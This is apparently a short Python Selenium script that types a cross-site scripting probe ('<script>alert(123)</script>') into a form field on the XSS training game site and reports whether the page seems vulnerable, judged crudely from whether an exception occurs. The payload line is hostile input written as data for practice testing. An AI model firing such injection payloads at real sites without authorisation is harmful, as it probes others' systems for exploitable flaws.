from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.options import Options
# from pyvirtualdisplay import Display
from time import sleep


def check_vulnerable(url, xpath, payload):
    options = Options()
    options.headless = True
    options.add_argument('--no-sandbox')
    # options.binary_location = '/usr/bin/chromedriver'
    driver = webdriver.Chrome(options=options, executable_path='/usr/bin/chromedriver')
    driver.get(url=url)
    driver.find_element_by_xpath(xpath=xpath).send_keys(payload + Keys.ENTER)
    try:
        sleep(2)
        driver.page_source
        status = 'Payload is NOT vulnerable'
    except:
        status = 'Payload is vulnerable'
    driver.quit()
    return status


vulnerable = check_vulnerable(url='https://xss-game.appspot.com/level1/frame',
                              xpath='//*[@id="query"]',
                              payload=' <script>alert(123)</script>')

print(vulnerable)